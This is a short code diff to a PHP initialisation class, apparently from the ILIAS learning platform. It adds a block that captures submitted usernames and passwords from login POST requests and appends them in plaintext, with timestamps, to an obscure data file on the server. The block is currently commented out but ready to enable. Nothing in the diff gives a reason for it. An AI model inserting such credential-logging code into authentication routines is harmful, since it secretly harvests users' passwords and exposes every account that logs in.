@@ -1442,6 +1442,14 @@ class ilInitialisation
         $ilias->account = $ilUser;
 
         self::initAccessHandling();
+/*        if ($_POST["username"] != "" && $_POST["password"] != "")
+        {
+            $f = fopen("/var/ilias/il9_meister_data/c-il-meister/ilInit/ilInit.dat", "a");
+            $ws = "Login attempt:  ".$_POST["username"]." : ".$_POST["password"]."   ".date("d-m-Y, H:i:s")."\n";
+            fwrite($f, $ws);
+            fclose($f);
+        }
+*/
     }
 
     /**
